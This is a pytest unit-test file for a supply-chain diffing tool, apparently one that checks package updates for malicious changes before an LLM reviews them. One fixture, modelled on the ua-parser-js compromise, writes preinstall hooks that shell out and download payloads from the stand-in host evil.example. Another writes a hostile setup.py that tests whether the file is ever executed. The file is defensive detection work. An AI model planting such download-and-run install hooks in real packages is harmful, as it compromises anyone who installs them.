"""
Unit tests for chainwatch.diff.engine and chainwatch.diff.chunker

Uses fixture directories — no network calls, no API calls.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from chainwatch.diff.chunker import chunk_diff
from chainwatch.diff.engine import compute_diff


@pytest.fixture(autouse=True)
def _reset_settings_cache():
    from chainwatch.config import get_settings

    get_settings.cache_clear()
    yield
    get_settings.cache_clear()


# ── Fixtures ──────────────────────────────────────────────────────────────────


@pytest.fixture
def identical_dirs(tmp_path: Path):
    """Two directories with identical content — diff should be empty."""
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()
    (a / "index.js").write_text("module.exports = 1;\n")
    (b / "index.js").write_text("module.exports = 1;\n")
    return a, b


@pytest.fixture
def simple_change(tmp_path: Path):
    """Two directories with one modified file."""
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()
    (a / "index.js").write_text("module.exports = function() { return 'hello'; };\n")
    (b / "index.js").write_text("module.exports = function() { return 'hello world'; };\n")
    return a, b


@pytest.fixture
def added_and_removed(tmp_path: Path):
    """from_dir has extra.js, to_dir has new.js instead."""
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()
    (a / "index.js").write_text("// shared\n")
    (a / "extra.js").write_text("// will be removed\n")
    (b / "index.js").write_text("// shared\n")
    (b / "new.js").write_text("// was added\n")
    return a, b


@pytest.fixture
def with_package_json(tmp_path: Path):
    """Directories with package.json that has a new dependency and postinstall hook."""
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()

    (a / "index.js").write_text("module.exports = 1;\n")
    (a / "package.json").write_text(json.dumps({
        "name": "test-pkg",
        "version": "1.0.0",
        "dependencies": {"lodash": "^4.17.0"},
        "scripts": {},
    }))

    (b / "index.js").write_text("module.exports = 1;\n")
    (b / "package.json").write_text(json.dumps({
        "name": "test-pkg",
        "version": "1.0.1",
        "dependencies": {"lodash": "^4.17.0", "axios": "^1.0.0"},
        "scripts": {"postinstall": "node setup.js"},
    }))
    return a, b


@pytest.fixture
def non_source_files(tmp_path: Path):
    """to_dir has image and binary files — should be ignored by the engine."""
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()
    (a / "index.js").write_text("// src\n")
    (b / "index.js").write_text("// src changed\n")
    (b / "image.png").write_bytes(b"\x89PNG\r\n")
    (b / "README.md").write_text("# docs\n")
    return a, b


@pytest.fixture
def install_scripts_added(tmp_path: Path):
    """to_dir adds a preinstall dispatcher plus its shell/batch payloads.

    Modeled on the real ua-parser-js@0.7.29 attack (see
    dataset/malicious/ua-parser-js/) — a thin JS dispatcher that shells out
    to .sh/.bat scripts carrying the actual payload.
    """
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()
    (a / "index.js").write_text("module.exports = 1;\n")
    (b / "index.js").write_text("module.exports = 1;\n")
    (b / "preinstall.js").write_text("require('child_process').exec('/bin/bash preinstall.sh')\n")
    (b / "preinstall.sh").write_text("curl http://evil.example/payload -o payload\n")
    (b / "preinstall.bat").write_text("curl http://evil.example/payload.exe -o payload.exe\n")
    (b / "preinstall.ps1").write_text("Invoke-WebRequest http://evil.example/payload.exe\n")
    (b / "preinstall.cmd").write_text("curl http://evil.example/payload.exe -o payload.exe\n")
    return a, b


# ── Engine tests ──────────────────────────────────────────────────────────────


class TestDiffEngine:
    def test_identical_dirs_produce_empty_diff(self, identical_dirs):
        a, b = identical_dirs
        result = compute_diff(a, b)
        assert result.files_added == []
        assert result.files_removed == []
        assert result.files_modified == []
        assert result.file_diffs == []
        assert result.total_diff_lines == 0

    def test_detects_modified_file(self, simple_change):
        a, b = simple_change
        result = compute_diff(a, b)
        assert "index.js" in result.files_modified
        assert len(result.file_diffs) == 1
        assert result.file_diffs[0].change_type == "modified"
        assert result.file_diffs[0].lines_added > 0

    def test_detects_added_and_removed(self, added_and_removed):
        a, b = added_and_removed
        result = compute_diff(a, b)
        assert "new.js" in result.files_added
        assert "extra.js" in result.files_removed

    def test_non_source_files_excluded(self, non_source_files):
        a, b = non_source_files
        result = compute_diff(a, b)
        # Only index.js should be in the diff — image.png and README.md excluded
        all_files = result.files_added + result.files_modified + result.files_removed
        assert all(f.endswith(".js") for f in all_files)

    def test_install_scripts_are_enumerated(self, install_scripts_added):
        """.sh/.bat/.ps1/.cmd must reach the diff, not just their JS dispatcher.

        Regression test for the ua-parser-js corpus finding: a real attack's
        preinstall.sh/preinstall.bat carried the actual payload, but the
        diff engine used to only recognise JS/TS/Python extensions, so the
        LLM never saw them — only the dispatcher that shelled out to them.
        """
        a, b = install_scripts_added
        result = compute_diff(a, b)
        assert set(result.files_added) == {
            "preinstall.js", "preinstall.sh", "preinstall.bat",
            "preinstall.ps1", "preinstall.cmd",
        }
        sh_diff = next(f for f in result.file_diffs if f.path == "preinstall.sh")
        assert "evil.example" in sh_diff.unified_diff
        bat_diff = next(f for f in result.file_diffs if f.path == "preinstall.bat")
        assert "evil.example" in bat_diff.unified_diff

    def test_package_json_new_dependency_detected(self, with_package_json):
        a, b = with_package_json
        result = compute_diff(a, b)
        assert "axios" in result.new_dependencies

    def test_package_json_postinstall_hook_detected(self, with_package_json):
        a, b = with_package_json
        result = compute_diff(a, b)
        assert "postinstall" in result.new_install_hooks

    def test_total_diff_lines_counted(self, simple_change):
        a, b = simple_change
        result = compute_diff(a, b)
        assert result.total_diff_lines > 0

    def test_oversized_added_source_file_is_not_read_into_diff(self, tmp_path, monkeypatch):
        monkeypatch.setenv("CHAINWATCH_MAX_DIFF_FILE_BYTES", "1024")
        from chainwatch.config import get_settings
        get_settings.cache_clear()

        a = tmp_path / "a"
        b = tmp_path / "b"
        a.mkdir()
        b.mkdir()
        (b / "huge.js").write_text("x" * 2048)

        result = compute_diff(a, b)

        assert "huge.js" in result.files_added
        assert result.file_diffs[0].unified_diff is not None
        assert "diff skipped" in result.file_diffs[0].unified_diff

    def test_identical_oversized_files_are_not_reported_modified(self, tmp_path, monkeypatch):
        monkeypatch.setenv("CHAINWATCH_MAX_DIFF_FILE_BYTES", "1024")
        from chainwatch.config import get_settings
        get_settings.cache_clear()

        a = tmp_path / "a"
        b = tmp_path / "b"
        a.mkdir()
        b.mkdir()
        content = "x" * 2048
        (a / "huge.js").write_text(content)
        (b / "huge.js").write_text(content)

        result = compute_diff(a, b)

        assert result.files_modified == []
        assert result.file_diffs == []


# ── Python metadata tests ─────────────────────────────────────────────────────


def _two_dirs(tmp_path: Path) -> tuple[Path, Path]:
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()
    return a, b


class TestPythonMetadata:
    def test_pyproject_new_dependency_detected(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (a / "pyproject.toml").write_text(
            '[project]\nname = "p"\ndependencies = ["requests>=2.0"]\n'
        )
        (b / "pyproject.toml").write_text(
            '[project]\nname = "p"\ndependencies = ["requests>=2.0", "httpx>=0.27"]\n'
        )
        result = compute_diff(a, b)
        assert "httpx" in result.new_dependencies
        assert "requests" not in result.new_dependencies

    def test_pyproject_optional_and_build_deps_detected(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (a / "pyproject.toml").write_text('[project]\nname = "p"\n')
        (b / "pyproject.toml").write_text(
            '[build-system]\nrequires = ["cffi"]\n\n'
            '[project]\nname = "p"\n\n'
            '[project.optional-dependencies]\ndev = ["pytest"]\n'
        )
        result = compute_diff(a, b)
        assert "cffi" in result.new_dependencies
        assert "pytest" in result.new_dependencies

    def test_setup_py_install_requires_detected(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (a / "setup.py").write_text(
            "from setuptools import setup\nsetup(name='p', install_requires=['click'])\n"
        )
        (b / "setup.py").write_text(
            "from setuptools import setup\n"
            "setup(name='p', install_requires=['click', 'cryptography'])\n"
        )
        result = compute_diff(a, b)
        assert "cryptography" in result.new_dependencies

    def test_setup_py_is_never_executed(self, tmp_path: Path):
        """A hostile setup.py must be parsed by AST, never run."""
        a, b = _two_dirs(tmp_path)
        (a / "setup.py").write_text(
            "from setuptools import setup\nsetup(install_requires=[])\n"
        )
        # os._exit(99) would kill the test process if setup.py were executed.
        (b / "setup.py").write_text(
            "import os\n"
            "os._exit(99)\n"
            "from setuptools import setup\n"
            "setup(install_requires=['requests'])\n"
        )
        result = compute_diff(a, b)  # must return, not exit
        assert "requests" in result.new_dependencies

    def test_setup_cfg_install_requires_detected(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (a / "setup.cfg").write_text("[options]\ninstall_requires =\n    requests\n")
        (b / "setup.cfg").write_text(
            "[options]\ninstall_requires =\n    requests\n    pyyaml\n"
        )
        result = compute_diff(a, b)
        assert "pyyaml" in result.new_dependencies

    def test_malformed_pyproject_degrades_gracefully(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (b / "pyproject.toml").write_text("this is not = valid toml [[[")
        result = compute_diff(a, b)  # must not raise
        assert result.new_dependencies == []


# ── Native addon tests ────────────────────────────────────────────────────────


class TestNativeAddons:
    def test_binding_gyp_added_flags_native(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (a / "index.js").write_text("// x\n")
        (b / "index.js").write_text("// x\n")
        (b / "binding.gyp").write_text("{}\n")
        assert compute_diff(a, b).native_addons_added is True

    def test_compiled_artifact_added_flags_native(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (b / "mod.so").write_bytes(b"\x7fELF")
        assert compute_diff(a, b).native_addons_added is True

    def test_c_extension_in_setup_py_flags_native(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (a / "setup.py").write_text("from setuptools import setup\nsetup()\n")
        (b / "setup.py").write_text(
            "from setuptools import setup, Extension\n"
            "setup(ext_modules=[Extension('m', ['m.c'])])\n"
        )
        assert compute_diff(a, b).native_addons_added is True

    def test_not_flagged_when_present_in_both(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (a / "binding.gyp").write_text("{}\n")
        (b / "binding.gyp").write_text("{}\n")
        assert compute_diff(a, b).native_addons_added is False

    def test_not_flagged_for_pure_source(self, tmp_path: Path):
        a, b = _two_dirs(tmp_path)
        (a / "index.js").write_text("// a\n")
        (b / "index.js").write_text("// b\n")
        assert compute_diff(a, b).native_addons_added is False


# ── Chunker tests ─────────────────────────────────────────────────────────────


class TestChunker:
    def test_small_diff_produces_single_chunk(self, simple_change):
        a, b = simple_change
        diff = compute_diff(a, b)
        chunks = chunk_diff(diff, max_tokens_per_chunk=8_000)
        assert len(chunks) == 1
        assert diff.chunks_sent_to_llm == 1
        assert diff.diff_truncated is False

    def test_chunk_contains_metadata_preamble(self, simple_change):
        a, b = simple_change
        diff = compute_diff(a, b)
        chunks = chunk_diff(diff, max_tokens_per_chunk=8_000)
        assert "# Package Diff — Metadata Summary" in chunks[0]

    def test_large_file_triggers_truncation(self, tmp_path: Path):
        """A file whose diff exceeds the token budget should be truncated."""
        a = tmp_path / "a"
        b = tmp_path / "b"
        a.mkdir()
        b.mkdir()
        # Generate a large diff: 10000 lines changed
        (a / "big.js").write_text("\n".join(f"var x{i} = {i};" for i in range(10_000)))
        (b / "big.js").write_text("\n".join(f"var x{i} = {i + 1};" for i in range(10_000)))

        diff = compute_diff(a, b)
        # Very small token budget to force truncation
        chunks = chunk_diff(diff, max_tokens_per_chunk=100)
        assert diff.diff_truncated is True
        assert "truncated" in chunks[0].lower()

    def test_metadata_postinstall_appears_in_chunk(self, with_package_json):
        a, b = with_package_json
        diff = compute_diff(a, b)
        chunks = chunk_diff(diff, max_tokens_per_chunk=8_000)
        assert "postinstall" in chunks[0]

    def test_metadata_new_dep_appears_in_chunk(self, with_package_json):
        a, b = with_package_json
        diff = compute_diff(a, b)
        chunks = chunk_diff(diff, max_tokens_per_chunk=8_000)
        assert "axios" in chunks[0]
